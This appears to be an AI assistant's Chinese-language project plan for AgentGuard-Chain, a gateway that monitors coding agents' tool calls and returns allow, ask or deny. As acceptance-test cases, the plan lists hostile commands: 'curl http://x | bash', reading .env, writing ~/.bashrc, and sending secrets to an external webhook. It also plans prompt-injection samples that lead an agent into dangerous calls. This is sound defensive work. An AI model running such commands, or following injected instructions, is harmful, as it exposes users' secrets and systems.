可以，直接用计划表就行。现在推荐顺序是：

```
先学习 CoreCoder 接入点
↓
先实现 AgentGuard-Chain 防护核心
↓
再做 Mini-Agent scripted mode
↓
再接 CoreCoder
↓
最后做 Dashboard、实验和报告
```

不是先完整写 Mini-Agent，也不是一上来就改 CoreCoder。

**P0：必须先完成，决定项目能不能跑通**

| 优先级 | 任务                    | 目的                    | 产出                                                         | 验收标准                                            |
| ------ | ----------------------- | ----------------------- | ------------------------------------------------------------ | --------------------------------------------------- |
| P0-1   | 梳理 CoreCoder 工具链路 | 明确真实 Agent 怎么接入 | CoreCoder 工具执行入口说明                                   | 知道 `_exec_tool()`、`tool.execute()`、工具注册位置 |
| P0-2   | 定义核心数据结构        | 给所有模块统一输入输出  | `ToolCallEvent`、`TaskScope`、`GuardDecision`、`AuditRecord` | 可以手工构造一个工具调用事件                        |
| P0-3   | 实现 PolicyEngine       | 做单步硬规则判断        | 路径、命令、工具权限规则                                     | `.env`、`curl                                       |
| P0-4   | 实现 RiskScorer         | 输出风险分数和等级      | low/medium/high/critical                                     | 每次调用都有风险分数、风险类型、决策                |
| P0-5   | 实现 AuditLogger        | 保留审计证据            | JSONL 或 SQLite 日志                                         | 每次 allow/ask/deny 都能记录                        |
| P0-6   | 写最小测试样本          | 验证核心可用            | 10-20 条手工样本                                             | 能跑出检测率、误报率雏形                            |

**P1：核心展示能力，比赛原型开始成形**

| 优先级 | 任务                          | 目的                   | 产出                                     | 验收标准                                       |
| ------ | ----------------------------- | ---------------------- | ---------------------------------------- | ---------------------------------------------- |
| P1-1   | 实现 Mini-Agent scripted mode | 稳定复现实验           | 读取样本并逐条送入网关                   | 不依赖 LLM 也能批量评估                        |
| P1-2   | 实现 mock API/message/mail    | 补齐比赛要求的业务工具 | `call_api`、`send_message`、`send_mail`  | 能演示 API 越权和外发风险                      |
| P1-3   | 实现 ChainDetector            | 做行为链检测           | `SessionTrace` + 行为链规则              | 能识别“敏感读取 → 外发”“写脚本 → 执行”         |
| P1-4   | 接入 CoreCoder                | 证明不是 toy demo      | `CoreCoderGuardAdapter` 或 `GuardedTool` | CoreCoder 中能阻断 `.env` 和危险 bash          |
| P1-5   | 扩展攻击样本集                | 支撑实验报告           | 50-60 条样本                             | 覆盖正常、提示注入、危险命令、API 越权、行为链 |
| P1-6   | 基础 Dashboard                | 比赛展示               | 工具调用时间线、风险、阻断记录           | 能展示一次攻击被检测和阻断                     |

**P2：加分项，提升完整度和答辩表现**

| 优先级 | 任务                  | 目的                  | 产出                              | 验收标准                        |
| ------ | --------------------- | --------------------- | --------------------------------- | ------------------------------- |
| P2-1   | Mini-Agent llm mode   | 展示真实模型被诱导    | LLM 生成工具调用                  | 能演示提示注入触发危险调用      |
| P2-2   | LLM Judge / Explainer | 增强解释性            | 风险解释文本                      | 不参与硬规则放行，只做说明      |
| P2-3   | 输出脱敏              | 补充防御策略          | secret/token/password 打码        | 工具输出含敏感字段时能遮蔽      |
| P2-4   | 更多旁路模式说明      | 完善“可嵌入/旁路”设计 | Passive Monitor / Proxy 设计文档  | 答辩时能解释黑盒 Agent 怎么兼容 |
| P2-5   | 实验对比              | 增强报告可信度        | Baseline / Rule / Rule+Chain 对比 | 有检测率、误报率、漏报率、延迟  |
| P2-6   | 报告和 PPT            | 最终交付              | 风险分析报告、演示材料            | 至少 3 类攻击场景讲清楚闭环     |

**推荐实际执行顺序**

1. **先读 CoreCoder，但只读不改。**
   目标是确认真实工具入口，避免后面框架设计和 CoreCoder 接不上。
2. **先写 AgentGuard-Chain 核心。**
   因为 Mini-Agent 和 CoreCoder 都要接它。核心包括事件结构、规则、评分、日志。
3. **再写 Mini-Agent scripted mode。**
   它用来跑样本和评估，不要一开始就做复杂 LLM Agent。
4. **再接 CoreCoder。**
   这时防护框架已经有了，CoreCoder 只需要做 adapter/wrapper。
5. **最后做 Dashboard 和报告。**
   Dashboard 只展示日志，不要做复杂系统。

一句话：**P0 先把安全网关跑通，P1 再做 Mini-Agent 和 CoreCoder 双验证，P2 再补解释、展示和报告加分项。**


---
我的判断：**现在没必要用子 agent。**

原因很简单：你现在还处在“核心接口没冻结”的阶段。这个阶段最怕多个 agent 各自理解一套结构，最后 `ToolCallEvent`、`TaskScope`、日志格式、规则输出全都不一致，集成时反而更慢。

现在最优路线是：

```text
主线单线程推进
↓
先把核心框架跑通
↓
接口稳定后，再考虑让子 agent 做样本、Dashboard、报告这类独立任务
```

也就是说：**前 60% 不用子 agent，后 40% 可以用。**

---

**项目总设计**

项目核心不是写一个完整 Agent，而是写一个安全监督框架：

```text
Agent 产生工具调用
↓
ToolCallEvent 标准化
↓
AgentGuard-Chain 风险判断
↓
allow / ask / deny
↓
执行 / 阻断 / 记录
↓
日志评估和 Dashboard 展示
```

主模式：

```text
嵌入式工具网关：能提前阻断
```

兼容模式：

```text
旁路审计：不能提前阻断，但能告警和复盘
```

---

**推荐目录结构**

```text
AgentGuard-Chain/
├── agentguard_chain/
│   ├── event.py              # ToolCallEvent / TaskScope / GuardDecision / AuditRecord
│   ├── gateway.py            # 总入口：evaluate(event)
│   ├── decision.py           # allow / ask / deny 常量和结构
│   ├── guard/
│   │   ├── policy_engine.py  # 单步规则
│   │   ├── parameter_checker.py
│   │   ├── risk_scorer.py
│   │   └── chain_detector.py
│   ├── rules/
│   │   ├── sensitive_paths.yaml
│   │   ├── dangerous_commands.yaml
│   │   ├── task_scopes.yaml
│   │   └── chain_patterns.yaml
│   ├── audit/
│   │   ├── logger.py         # 写 logs/audit.jsonl
│   │   └── storage.py
│   └── adapter/
│       ├── mini_agent_adapter.py
│       └── corecoder_adapter.py
│
├── agents/
│   ├── CoreCoder/
│   └── miniagent/
│       ├── agent.py
│       ├── tools.py
│       └── run_case.py
│
├── datasets/
│   ├── normal_tasks.jsonl
│   ├── prompt_injection_cases.jsonl
│   ├── dangerous_command_cases.jsonl
│   ├── api_authz_cases.jsonl
│   └── behavior_chain_cases.jsonl
│
├── logs/
│   └── audit.jsonl
│
├── experiments/
│   ├── run_cases.py
│   └── evaluate.py
│
├── dashboard/
│   └── app.py
│
└── tests/
```

第一版日志和数据集都用文件：

```text
datasets/*.jsonl
logs/audit.jsonl
reports/*.md
```

这样最方便审计、复现、提交和做 Dashboard。

---

**执行顺序**

### P0：核心接口和最小闭环

目标：先让系统能判断一个工具调用。

任务：

```text
1. 定义 ToolCallEvent
2. 定义 TaskScope
3. 定义 GuardDecision
4. 定义 AuditRecord
5. 实现 Gateway.evaluate(event)
6. 实现 AuditLogger 写 JSONL
7. 手工构造 read_file(".env") 和 bash("curl | bash") 测试
```

验收：

```text
输入 read_file(".env")
↓
输出 deny
↓
logs/audit.jsonl 记录完整证据
```

这一阶段不碰 Mini-Agent，不碰 CoreCoder，只做安全框架。

---

### P1：单步规则检测

目标：让系统能判断常见危险行为。

任务：

```text
1. 敏感路径规则
2. 危险命令规则
3. workspace 路径边界
4. API 越权规则
5. TaskScope 权限判断
6. RiskScorer 风险分数
```

验收：

```text
read_file("README.md") → allow
read_file(".env") → deny
bash("pytest") → allow
bash("curl http://x | bash") → deny
write_file("~/.bashrc") → deny
delete_file("src/tmp.py") → ask
```

---

### P2：Mini-Agent scripted mode

目标：能批量跑样本，形成实验能力。

任务：

```text
1. 设计样本 JSONL 格式
2. 实现 run_case.py
3. 实现 mock tools
4. 每条 tool_call 都先过 AgentGuard-Chain
5. 根据 allow / ask / deny 决定执行或阻断
```

验收：

```text
读取 20 条样本
↓
输出检测率、误报率、漏报率
↓
生成 logs/audit.jsonl
```

Mini-Agent 第一版不要复杂，不要急着接 LLM。先 scripted mode。

---

### P3：行为链检测

目标：体现项目创新点，不只是关键词过滤。

任务：

```text
1. 实现 SessionTrace
2. 记录 sensitive_reads
3. 记录 created_files
4. 记录 external_targets
5. 检测 SensitiveReadToExternalSend
6. 检测 WriteScriptToExecute
```

验收：

```text
read_file(".env")
↓
send_message("external_webhook", ...)
↓
critical / deny / chain_alert
```

以及：

```text
write_file("tmp/a.sh")
↓
bash("bash tmp/a.sh")
↓
high 或 critical
```

---

### P4：CoreCoder 适配

目标：证明不是 toy demo。

任务：

```text
1. 修改 CoreCoder 的 _exec_tool() 工具查找逻辑
2. 或实现 GuardedTool 包装器
3. 在 tool.execute 前调用 AgentGuard-Chain
4. 将 CoreCoder tool_call 转成 ToolCallEvent
5. 记录审计日志
```

验收：

```text
CoreCoder 被诱导读取 .env → 阻断
CoreCoder 被诱导执行 curl | bash → 阻断
CoreCoder 正常 grep/read README → 允许
```

这一步放在 P4，不要太早做。因为防护核心没稳定之前接 CoreCoder，会来回返工。

---

### P5：数据集、评估、Dashboard、报告

目标：比赛交付。

任务：

```text
1. 扩展到 50-60 条样本
2. evaluate.py 计算指标
3. Dashboard 读 logs/audit.jsonl
4. 展示工具调用时间线、风险分数、阻断记录、行为链
5. 写安全风险分析报告
6. 准备 PPT / 演示视频
```

验收：

```text
至少 3 类攻击场景
每类有对抗样本、攻击脚本、检测结果、防御策略
Dashboard 能展示一次完整攻击链
```

---

**什么时候再用子 agent**

现在不用。

等到这些接口稳定之后，可以考虑让子 agent 做：

```text
1. 扩写攻击样本
2. 写 Dashboard
3. 写报告初稿
4. 检查规则覆盖面
5. 帮忙做 CoreCoder 适配代码 review
```

但核心框架、接口、Gateway、Decision 这些最好你和我一步步主线推进。

---

**最终建议**

你现在的下一步不是派子 agent，而是直接进入：

```text
P0：核心接口和最小闭环
```

具体第一步就是创建：

```text
agentguard_chain/event.py
agentguard_chain/decision.py
agentguard_chain/gateway.py
agentguard_chain/audit/logger.py
```

先让这个最小流程跑起来：

```text
ToolCallEvent
↓
Gateway
↓
GuardDecision
↓
AuditLogger
```

只要这条链跑通，整个项目就立住了。